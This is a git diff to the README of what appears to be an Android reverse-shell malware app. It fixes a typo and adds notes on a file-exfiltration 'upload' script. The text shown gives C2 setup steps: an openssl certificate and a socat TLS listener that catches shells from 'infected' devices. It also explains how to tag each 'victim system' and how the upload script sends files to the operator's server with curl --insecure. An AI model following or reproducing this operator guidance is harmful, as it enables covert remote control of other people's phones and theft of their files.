@@ -84,7 +84,7 @@ You can use an IP or an hostname. Example:
 Ofcourse you must use a **public address**, set **port forwarding** and firewall rules on your router. Additionally, you can use DNS, Ngrok and other services for reachability and to route your traffic but **how to set this configurations or use those services is out of the scope of this documentation!**
 
 ### How to start a session
-1. Generate a certificate for the TLS connection on you C2 server:
+1. Generate a certificate for the TLS connection on your C2 server:
 ```
 openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
 cat bind.key bind.crt > bind.pem
@@ -94,3 +94,17 @@ cat bind.key bind.crt > bind.pem
 sudo socat -d -d OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
 ```
 Note: this app is not designed to work in a multi-client environment. The easiest thing you can do to use it with multiple devices is to use a different IP port for each infected machine and change the content of `./revshellSdk28/app/src/main/res/raw/whoami` to set a recognizable name for the victim system.
+
+### Notes on the `upload` script
+This script permits file exfiltration over HTTPS. 
+
+To perform this task the file is first Urlencoded then uploaded using `curl` with `--insecure` and `--dns-servers` flags.
+
+If the request return `200 OK` the file is already on the server so it's not uploaded again.
+
+The file is located in `./revshellSdk28/app/src/main/res/raw/upload` and **you must modify it to set your C2 server!**
+
+Note: **a simple HTTP file receiver is included in this project. **
+
+
+### Notes Curl usage
